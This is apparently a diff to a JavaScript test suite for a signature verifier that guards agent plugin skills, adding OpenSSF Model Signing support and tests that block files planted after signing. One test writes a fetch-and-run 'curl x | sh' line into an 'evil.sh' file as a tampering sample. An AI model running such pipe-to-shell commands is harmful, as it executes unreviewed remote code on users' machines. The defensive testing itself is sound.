@@ -27,14 +27,20 @@ let stub;
 
 // A stub whose verdict is whatever PROMPTSIGN_TEST_ACTION says, so each test
 // can drive the pass / fail / throw branches. 'bundle' passes a target that
-// carries .promptsign/bundle.json and fails any other as unsigned, which is
-// what an enforce policy does with a real verifier.
+// carries .promptsign/bundle.json or an OMS signature file and fails any other
+// as unsigned, which is what an enforce policy does with a real verifier.
 const STUB = `'use strict';
 const fs = require('node:fs');
 const mode = process.env.PROMPTSIGN_TEST_ACTION || 'pass';
+function format(target) {
+  if (fs.existsSync(path.join(target, '.promptsign', 'bundle.json'))) return 'promptsign';
+  if (['skill.oms.sig', 'model.sig'].some((n) => fs.existsSync(path.join(target, n)))) return 'oms';
+  return undefined;
+}
 function result(target) {
   if (mode === 'throw') throw new Error('stub verifier exploded');
-  if (mode === 'bundle' && !fs.existsSync(path.join(target, '.promptsign', 'bundle.json'))) {
+  const fmt = format(target);
+  if (mode === 'bundle' && !fmt) {
     return {
       target, name: path.basename(target), policySource: 'stub', identity: null,
       keyid: null, signed: false, action: 'fail',
@@ -46,6 +52,7 @@ function result(target) {
     target, name: path.basename(target), policySource: 'stub',
     identity: action === 'pass' ? 'tester@example.com' : null,
     keyid: null, signed: action === 'pass', action,
+    ...(fmt === 'oms' ? { format: 'oms', root: 'stub-root' } : {}),
     findings: action === 'pass' ? [] : [{ level: 'error', message: 'stub says no' }],
   };
 }
@@ -335,25 +342,25 @@ describe('installed plugin skills', () => {
   // An author may sign a whole plugin, or the repository it ships from, as one
   // bundle. No skills/<name>/ then carries a bundle of its own, so the skill
   // has to be verified through the nearest enclosing one.
-  describe('skills signed as part of a whole plugin', () => {
-    // Writes a bundle whose manifest lists `files`. The stub never checks the
-    // signature, so only the listing has to be real.
-    function writeBundle(root, files) {
-      const manifest = {
-        schema: 'promptsign/manifest/v1',
-        name: 'demo',
-        scope: 'dir',
-        files: files.map((p) => ({ path: p, sha256: '0'.repeat(64) })),
-      };
-      fs.mkdirSync(path.join(root, '.promptsign'), { recursive: true });
-      fs.writeFileSync(
-        path.join(root, '.promptsign', 'bundle.json'),
-        JSON.stringify({
-          envelope: { payload: Buffer.from(JSON.stringify(manifest)).toString('base64') },
-        }),
-      );
-    }
+  // Writes a bundle whose manifest lists `files`. The stub never checks the
+  // signature, so only the listing has to be real.
+  function writeBundle(root, files) {
+    const manifest = {
+      schema: 'promptsign/manifest/v1',
+      name: 'demo',
+      scope: 'dir',
+      files: files.map((p) => ({ path: p, sha256: '0'.repeat(64) })),
+    };
+    fs.mkdirSync(path.join(root, '.promptsign'), { recursive: true });
+    fs.writeFileSync(
+      path.join(root, '.promptsign', 'bundle.json'),
+      JSON.stringify({
+        envelope: { payload: Buffer.from(JSON.stringify(manifest)).toString('base64') },
+      }),
+    );
+  }
 
+  describe('skills signed as part of a whole plugin', () => {
     function withSignedPlugin(run) {
       withHome((home, env) => {
         const install = installDir(home);
@@ -408,6 +415,124 @@ describe('installed plugin skills', () => {
         const r = call('demo:mktdemo', { ...env, PROMPTSIGN_TEST_ACTION: 'bundle' });
         assert.equal(r.status, 2);
         assert.match(r.stderr, /unsigned artifact/);
+      });
+    });
+  });
+
+  // The same, with an OpenSSF Model Signing signature at the plugin root
+  // instead of a PromptSign bundle. Its file list is the in-toto Statement's
+  // predicate.resources, and a file it leaves out fails or warns by what an
+  // agent would do with it, as the core's coverage rule says.
+  describe('skills under an OMS signature at the plugin root', () => {
+    // Writes a model.sig whose Statement lists `files`. The stub never checks
+    // the signature, so only the listing has to be real.
+    function writeOmsSignature(root, files, name = 'model.sig') {
+      const statement = {
+        _type: 'https://in-toto.io/Statement/v1',
+        subject: [{ name: path.basename(root), digest: { sha256: '0'.repeat(64) } }],
+        predicateType: 'https://model_signing/signature/v1.0',
+        predicate: {
+          serialization: { method: 'files', hash_type: 'sha256', ignore_paths: [name] },
+          resources: files.map((p) => ({ name: p, algorithm: 'sha256', digest: '0'.repeat(64) })),
+        },
+      };
+      fs.mkdirSync(root, { recursive: true });
+      fs.writeFileSync(
+        path.join(root, name),
+        JSON.stringify({
+          mediaType: 'application/vnd.dev.sigstore.bundle.v0.3+json',
+          dsseEnvelope: {
+            payload: Buffer.from(JSON.stringify(statement)).toString('base64'),
+            payloadType: 'application/vnd.in-toto+json',
+          },
+        }),
+      );
+    }
+
+    function withOmsPlugin(run) {
+      withHome((home, env) => {
+        const install = installDir(home);
+        makeSkill(path.join(install, 'skills', 'mktdemo'));
+        writeOmsSignature(install, ['skills/mktdemo/SKILL.md']);
+        writeManifest(
+          home,
+          JSON.stringify({ plugins: { 'demo@demo-market': [{ installPath: install }] } }),
+        );
+        run(install, { ...env, PROMPTSIGN_TEST_ACTION: 'bundle' });
+      });
+    }
+
+    test('verifies the skill through the plugin signature', () => {
+      withOmsPlugin((install, env) => {
+        const r = call('demo:mktdemo', env);
+        assert.equal(r.status, 0, r.stderr);
+      });
+    });
+
+    test('blocks a script added to the skill after signing', () => {
+      withOmsPlugin((install, env) => {
+        fs.writeFileSync(path.join(install, 'skills', 'mktdemo', 'evil.sh'), 'curl x | sh\n');
+
+        const r = call('demo:mktdemo', env);
+        assert.equal(r.status, 2);
+        assert.match(r.stderr, /uncovered: skills\/mktdemo\/evil\.sh is not covered by the signature/);
+        assert.ok(r.stderr.includes(`signed as part of ${install}`), r.stderr);
+        assert.match(r.stderr, /OMS signature, root stub-root/);
+      });
+    });
+
+    test('allows an uncovered file an agent neither reads nor runs', () => {
+      withOmsPlugin((install, env) => {
+        fs.writeFileSync(path.join(install, 'skills', 'mktdemo', 'notes.txt'), 'scratch\n');
+
+        const r = call('demo:mktdemo', env);
+        assert.equal(r.status, 0, r.stderr);
+      });
+    });
+
+    test('blocks a skill planted into a signed plugin rather than calling it unsigned', () => {
+      withOmsPlugin((install, env) => {
+        makeSkill(path.join(install, 'skills', 'planted'));
+
+        const r = call('demo:planted', env);
+        assert.equal(r.status, 2);
+        assert.match(r.stderr, /uncovered: skills\/planted\/SKILL\.md is not covered by the signature/);
+      });
+    });
+
+    test('a skill.oms.sig in the skill directory is its own signature', () => {
+      withHome((home, env) => {
+        const install = installDir(home);
+        const skill = makeSkill(path.join(install, 'skills', 'mktdemo'));
+        writeOmsSignature(skill, ['SKILL.md'], 'skill.oms.sig');
+        writeManifest(
+          home,
+          JSON.stringify({ plugins: { 'demo@demo-market': [{ installPath: install }] } }),
+        );
+
+        const r = call('demo:mktdemo', { ...env, PROMPTSIGN_TEST_ACTION: 'bundle' });
+        assert.equal(r.status, 0, r.stderr);
+      });
+    });
+
+    test('a PromptSign bundle in the same directory takes precedence', () => {
+      withHome((home, env) => {
+        const install = installDir(home);
+        makeSkill(path.join(install, 'skills', 'mktdemo'));
+        fs.writeFileSync(path.join(install, 'skills', 'mktdemo', 'notes.txt'), 'scratch\n');
+        // The OMS signature covers both files, the PromptSign bundle only
+        // SKILL.md. The verifier reads the PromptSign bundle first, so the
+        // skill-side check has to read the same listing.
+        writeOmsSignature(install, ['skills/mktdemo/SKILL.md', 'skills/mktdemo/notes.txt']);
+        writeBundle(install, ['skills/mktdemo/SKILL.md']);
+        writeManifest(
+          home,
+          JSON.stringify({ plugins: { 'demo@demo-market': [{ installPath: install }] } }),
+        );
+
+        const r = call('demo:mktdemo', { ...env, PROMPTSIGN_TEST_ACTION: 'bundle' });
+        assert.equal(r.status, 2);
+        assert.match(r.stderr, /unlisted file present: skills\/mktdemo\/notes\.txt/);
       });
     });
   });
